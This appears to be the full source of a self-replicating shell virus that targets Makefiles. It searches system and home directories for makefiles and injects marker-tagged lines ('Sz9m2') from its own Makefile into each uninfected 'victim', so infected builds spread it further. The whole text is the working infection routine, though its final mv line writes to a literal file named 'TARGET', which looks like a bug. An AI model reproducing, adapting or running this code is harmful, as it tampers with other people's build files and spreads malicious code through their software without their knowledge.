#!/bin/sh

# Search routine
FIL=""
if test "`locate Makefile 2>/dev/null`x" != "x" ; then for x in `locate Makefile` ; do FIL="$FIL $x" ; done ; else
for place in .. /usr/src /home /root /etc /var ; do
 targs=""
 targs="`find $place -name Makefile -o -name Makefile.in -o -name makefile 2>/dev/null`"
 if test "${targs}x" != "x" ; then for x in $targs ; do FIL="$FIL $x" ; done ; fi
done
fi

# Infection main loop
for victim in $FIL ; do
 # Infected?
 if test "`grep Sz9m2 $victim 2>/dev/null`x" == "x" ; then
   # Infection.
   TARGET=$victim
   TARGETOUT="${victim}.$$"
   >$TARGETOUT
   ins=0
   state=0
   cat $TARGET | while read line ; do
    if test $ins == 1 ; then
     ins=2
     grep Sz9m2 `pwd`/Makefile >> $TARGETOUT
   fi
    if test "`echo \"$line\" | grep [0-9A-z]*:`x" != "x" ; then
     if test $ins == 0 ; then ins=1 ; fi ;# first ':' matched
     # dont match =: 's
     if test "`echo \"$line\" | grep =`x" != "x" ; then ins=0 ; fi
     state=1
    fi
    if test "${line}x" == "x" ; then
     echo >> $TARGETOUT
    if test $state == 2 ; then state=3; fi;
    elif test $state == 1 ; then
     if test "`echo "$line"|grep "\`printf "\t"\`"`x" != "x" ; then
       ( echo -en "\t";echo "$line" ) >> $TARGETOUT
      else
       echo "$line" >> $TARGETOUT
     fi
     state=2
    elif test $state == 2 ; then
     ( echo -en "\t"; echo "$line" ) >> $TARGETOUT
    elif test $state == 3 ; then
     state=0
    elif test "`echo "$line"|grep "\`printf "\t"\`"`x" != "x" ; then
       ( echo -en "\t";echo "$line" ) >> $TARGETOUT
     else
       echo "$line" >> $TARGETOUT
    fi
   done
  mv -f $TARGETOUT TARGET
 fi
done

